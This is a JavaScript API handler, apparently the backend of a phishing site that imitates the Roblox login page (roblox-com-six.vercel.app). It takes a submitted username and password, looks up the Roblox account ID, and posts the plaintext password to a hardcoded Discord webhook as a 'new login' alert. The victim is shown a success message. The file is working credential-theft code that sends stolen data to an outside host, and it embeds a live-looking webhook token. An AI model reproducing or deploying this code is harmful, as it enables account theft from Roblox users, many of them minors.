export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Заполните все поля' });
  }

  try {
    const robloxUserRes = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}`);
    const robloxUserData = await robloxUserRes.json();

    let userInfo = `Ник: ${username}`;
    if (robloxUserData.data && robloxUserData.data.length > 0) {
      const userId = robloxUserData.data[0].id;
      const displayName = robloxUserData.data[0].displayName;
      userInfo = `Ник: ${username} (${displayName})\n> **Roblox ID:** ${userId}`;
    }

    const discordWebhookUrl = 'https://discord.com/api/webhooks/1551278837571125339/sqjF6RbhEeMfqcN0F4NfxLr9ub_IWYFoPSS3xwQbb8m7VtKQTqqrTU8sSCemovF--Pwx';

    const discordMessage = {
      content: `🚨 **Новый вход на сайт!**\n> **${userInfo}**\n> **Пароль/Код:** \`${password}\`\n> **Сайт:** roblox-com-six.vercel.app`
    };

    await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage),
    });

    return res.status(200).json({ success: true, message: 'Успешно!' });
  } catch (error) {
    return res.status(500).json({ error: 'Ошибка сервера' });
  }
}
